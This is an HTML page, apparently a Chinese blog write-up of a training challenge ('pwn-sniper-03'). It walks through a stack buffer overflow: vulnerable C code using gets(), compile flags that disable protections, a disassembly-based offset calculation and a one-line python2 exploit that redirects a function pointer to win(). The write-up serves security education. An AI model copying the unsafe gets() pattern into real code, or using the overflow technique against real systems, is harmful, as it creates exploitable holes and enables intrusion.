@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>pwn-sniper-03 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">pwn-sniper-03</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1684304565506"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1687743085013"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><strong>漏洞程序源码如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span>
+{
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"code flow successfully changed\n"</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>
+{
+        <span class="hljs-keyword">volatile</span> <span class="hljs-title function_">int</span> <span class="hljs-params">(*fp)</span><span class="hljs-params">()</span>;
+        <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];
+
+        fp = <span class="hljs-number">0</span>;
+
+        gets(buffer);
+
+        <span class="hljs-keyword">if</span>(fp) {
+                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);
+                fp();
+        }
+}</code></pre></div>
+<p><strong>编译选项如下：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-section">a.out:hello.c</span>
+        gcc -g -fno-stack-protector -z execstack hello.c
+<span class="hljs-section">clean:</span>
+        rm ./a.out</code></pre></div>
+<p><strong>checksec</strong></p>
+<div><pre class="hljs"><code><span class="hljs-string">└─$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">--file=./a.out</span>
+[<span class="hljs-string">*</span>] <span class="hljs-string">'/home/kali/PwnMe/challenges/train/sniper/3/a.out'</span>
+    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span>
+    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span>
+    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span>
+    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span>
+    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span>
+    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span></code></pre></div>
+<p><strong>objdump</strong></p>
+<div><pre class="hljs"><code>└─$ objdump -t -j <span class="hljs-selector-class">.text</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.out</span>
+
+<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.out</span>:     file format elf64-x86-<span class="hljs-number">64</span>
+
+SYMBOL TABLE:
+<span class="hljs-number">00000000004004</span>d0 l    d  <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              <span class="hljs-selector-class">.text</span>
+<span class="hljs-number">0000000000400500</span> l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              deregister_tm_clones
+<span class="hljs-number">0000000000400530</span> l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              register_tm_clones
+<span class="hljs-number">0000000000400570</span> l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              __do_global_dtors_aux
+<span class="hljs-number">0000000000400590</span> l     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              frame_dummy
+<span class="hljs-number">0000000000400690</span> g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000002</span>              __libc_csu_fini
+<span class="hljs-number">0000000000400620</span> g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000065</span>              __libc_csu_init
+<span class="hljs-number">00000000004005</span>bd g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000010</span>              win
+<span class="hljs-number">00000000004004</span>d0 g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">0000000000000000</span>              _start
+<span class="hljs-number">00000000004005</span>cd g     F <span class="hljs-selector-class">.text</span>  <span class="hljs-number">000000000000004</span>d              main</code></pre></div>
+<p><strong>查看反编译代码</strong></p>
+<div><pre class="hljs"><code><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">dbg_main</span> <span class="hljs-params">(<span class="hljs-type">char</span> ** argv, <span class="hljs-type">int32_t</span> argc)</span> {
+    <span class="hljs-type">char</span> ** var_60h;
+    <span class="hljs-type">int32_t</span> var_54h;
+    <span class="hljs-type">char</span> [<span class="hljs-number">64</span>] buffer;
+    <span class="hljs-type">int32_t</span> fp;
+    rsi = argv;
+    rdi = argc;
+    <span class="hljs-comment">/* int main(int argc,char ** argv); */</span>
+    var_54h = edi;
+    var_60h = rsi;
+    fp = <span class="hljs-number">0</span>;
+    rax = &amp;buffer;
+    rdi = rax;
+    gets ();
+    <span class="hljs-keyword">if</span> (fp != <span class="hljs-number">0</span>) {
+        rax = fp;
+        rsi = fp;
+        eax = <span class="hljs-number">0</span>;
+        <span class="hljs-built_in">printf</span> (<span class="hljs-string">"calling function pointer, jumping to 0x%08x\n"</span>);
+        rdx = fp;
+        eax = <span class="hljs-number">0</span>;
+        <span class="hljs-type">void</span> (*rdx)() ();
+    }
+    <span class="hljs-keyword">return</span> rax;
+}</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-comment">// void win();</span>
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"code flow successfully changed"</span>);
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p><strong>本题目较为简单，没有开启什么保护，程序功能就是使用gets函数获取输入数据，判断fp变量是否为真，为真则执行print函数，我们可以通过溢出buffer变量到fp变量处，并覆盖EIP为win函数地址，从而执行win函数功能</strong></p>
+<p><strong>gdb调试</strong></p>
+<p><strong><img src="/_resources/2f910a091c634bb6bd242674aed5bf49.png" alt="1f5f13de80cd8f8bb704edd452af0728.png" width="641" height="467" class="jop-noMdConv" /></strong></p>
+<p><strong>buffer变量的偏移地址为bp-0x50h</strong></p>
+<p><strong><img src="/_resources/461200b460e94482a0336f0e14531c2e.png" alt="a2f071794bc60995a6c2a7054afd4be7.png" width="626" height="414" class="jop-noMdConv" /></strong></p>
+<p><strong>fp变量的偏移地址为bp-0x8h</strong></p>
+<p><strong>从而可以得出，buffer到fp 之间的距离为0x50h - 0x8h = 80-8 = 72</strong></p>
+<p><strong>查找win函数的地址</strong></p>
+<p><strong><img src="/_resources/e72fff9f3c13481a91a44e32bc5f44fb.png" alt="700f0763d6207bf66c783e32f35f4085.png" width="589" height="84" class="jop-noMdConv" /></strong></p>
+<p><strong>可以看到，win函数的地址为0x004005bd，exp如下：</strong></p>
+<div><pre class="hljs"><code>python2 -c <span class="hljs-string">"print 'A' * 72 + '\xbd\x05\x40\x00'"</span> | ./a.out  //win函数地址使用小端序</code></pre></div>
+<img src="/_resources/c6f1b8c927324ddbaf29d48addc38ed6.png" alt="a250c49c943f6109088ae68948963def.png" width="740" height="117" class="jop-noMdConv" /></div>
+      </article>
+    </div>
+  </body>
+</html>
